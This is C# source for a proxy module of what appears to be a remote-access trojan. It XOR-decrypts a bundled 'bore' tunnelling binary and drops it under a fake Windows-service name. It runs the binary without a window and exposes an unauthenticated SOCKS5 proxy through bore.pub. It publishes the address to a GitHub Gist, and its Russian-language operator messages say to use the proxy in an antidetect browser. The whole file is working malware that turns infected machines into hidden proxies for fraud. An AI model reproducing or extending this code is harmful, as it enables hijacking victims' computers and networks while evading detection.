using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Collections.Generic;
using System.Text.RegularExpressions;

namespace VanguardCore.Modules
{
    public class ProxyModule
    {
        private static bool _active = false;
        private static TcpListener _listener;
        private static Process _boreProcess;
        private static string _borePath;
        private static int _localPort = 4444;
        private static string _publicUrl = null;

        public static bool IsActive => _active;

        public static async Task<string> Start()
        {
            if (_active) return "[!] Proxy already running";

            try
            {
                _borePath = PrepareBore();
                if (string.IsNullOrEmpty(_borePath)) return "[!] bore.bin not found or blocked";

                _listener = new TcpListener(IPAddress.Loopback, _localPort);
                _listener.Start();
                _active = true;

                // Start local server thread
                _ = Task.Run(() => AcceptClients());

                // Start Bore tunnel
                _boreProcess = new Process();
                _boreProcess.StartInfo.FileName = _borePath;
                _boreProcess.StartInfo.Arguments = $"local {_localPort} --to bore.pub";
                _boreProcess.StartInfo.UseShellExecute = false;
                _boreProcess.StartInfo.RedirectStandardOutput = true;
                _boreProcess.StartInfo.CreateNoWindow = true;
                _boreProcess.Start();

                // Wait for port (timeout 15s)
                string output = "";
                DateTime start = DateTime.Now;
                while ((DateTime.Now - start).TotalSeconds < 15)
                {
                    if (_boreProcess.HasExited) break;
                    string line = _boreProcess.StandardOutput.ReadLine();
                    if (line != null)
                    {
                        output += line + "\n";
                        var match = Regex.Match(line, @"bore\.pub:(\d+)", RegexOptions.IgnoreCase);
                        if (match.Success)
                        {
                            string port = match.Groups[1].Value;
                            _publicUrl = $"bore.pub:{port}";
                            
                            // A-03: Update Gist for Mesh Discovery
                            await GistManager.UpdateFile("proxies.json", _publicUrl);
                            
                            return $"✅ <b>SOCKS5 прокси запущен!</b>\n\n" +
                                   $"🌐 <b>Адрес:</b> <code>{_publicUrl}</code>\n\n" +
                                   $"📱 <b>В антидетект браузере:</b>\n" +
                                   $"• Тип: <code>SOCKS5</code>\n" +
                                   $"• Host: <code>bore.pub</code>\n" +
                                   $"• Port: <code>{port}</code>";
                        }
                    }
                    Thread.Sleep(100);
                }

                Stop();
                return "[!] Bore timeout. Output:\n" + output;
            }
            catch (Exception ex)
            {
                Stop();
                return $"[!] Error: {ex.Message}";
            }
        }

        public static void Stop()
        {
            _active = false;
            _publicUrl = null;
            try { _listener?.Stop(); } catch { }
            try { _boreProcess?.Kill(); } catch { }
            if (!string.IsNullOrEmpty(_borePath) && File.Exists(_borePath))
            {
                try { File.Delete(_borePath); } catch { }
            }
        }

        private static string PrepareBore()
        {
            // PRO TIP: Using XOR-encrypted .bin (extracted from resources to WorkDir)
            string binPath = Path.Combine(ResourceModule.WorkDir, "bore.bin");
            if (!File.Exists(binPath)) return null;

            string dest = Path.Combine(ResourceModule.WorkDir, $"WUDHost-{Guid.NewGuid().ToString("N").Substring(0, 6).ToUpper()}.exe");

            try
            {
                byte[] encrypted = File.ReadAllBytes(binPath);
                byte[] decrypted = new byte[encrypted.Length];
                for (int i = 0; i < encrypted.Length; i++)
                    decrypted[i] = (byte)(encrypted[i] ^ 0x42);

                File.WriteAllBytes(dest, decrypted);
                return dest;
            }
            catch { return null; }
        }

        private static async Task AcceptClients()
        {
            while (_active)
            {
                try
                {
                    var client = await _listener.AcceptTcpClientAsync();
                    _ = Task.Run(() => HandleClient(client));
                }
                catch { if (!_active) break; }
            }
        }

        private static async Task HandleClient(TcpClient client)
        {
            using (client)
            using (var stream = client.GetStream())
            {
                try
                {
                    byte[] firstByte = new byte[1];
                    int read = await stream.ReadAsync(firstByte, 0, 1);
                    if (read == 0) return;

                    if (firstByte[0] == 0x05)
                    {
                        await HandleSocks5(stream);
                    }
                    else
                    {
                        // Minimal HTTP CONNECT handler could go here, but SOCKS5 is primary
                    }
                }
                catch { }
            }
        }

        private static async Task HandleSocks5(NetworkStream stream)
        {
            // SOCKS5 Handshake
            byte[] nmethodsB = new byte[1];
            await stream.ReadAsync(nmethodsB, 0, 1);
            byte[] methods = new byte[nmethodsB[0]];
            await stream.ReadAsync(methods, 0, methods.Length);
            await stream.WriteAsync(new byte[] { 0x05, 0x00 }, 0, 2); // No Auth

            // Request
            byte[] reqHeader = new byte[4];
            await stream.ReadAsync(reqHeader, 0, 4);
            if (reqHeader[1] != 0x01) return; // Only CONNECT

            string host = "";
            int port = 0;

            if (reqHeader[3] == 0x01) // IPv4
            {
                byte[] addr = new byte[4];
                await stream.ReadAsync(addr, 0, 4);
                host = $"{addr[0]}.{addr[1]}.{addr[2]}.{addr[3]}";
            }
            else if (reqHeader[3] == 0x03) // Domain
            {
                byte[] lenB = new byte[1];
                await stream.ReadAsync(lenB, 0, 1);
                byte[] hostB = new byte[lenB[0]];
                await stream.ReadAsync(hostB, 0, hostB.Length);
                host = Encoding.UTF8.GetString(hostB);
            }

            byte[] portB = new byte[2];
            await stream.ReadAsync(portB, 0, 2);
            port = (portB[0] << 8) | portB[1];

            try
            {
                using (var remoteClient = new TcpClient())
                {
                    await remoteClient.ConnectAsync(host, port);
                    await stream.WriteAsync(new byte[] { 0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10);
                    
                    using (var remoteStream = remoteClient.GetStream())
                    {
                        var t1 = stream.CopyToAsync(remoteStream);
                        var t2 = remoteStream.CopyToAsync(stream);
                        await Task.WhenAny(t1, t2);
                    }
                }
            }
            catch { await stream.WriteAsync(new byte[] { 0x05, 0x01, 0x00, 0x01, 0, 0, 0, 0, 0, 0 }, 0, 10); }
        }
    }
}
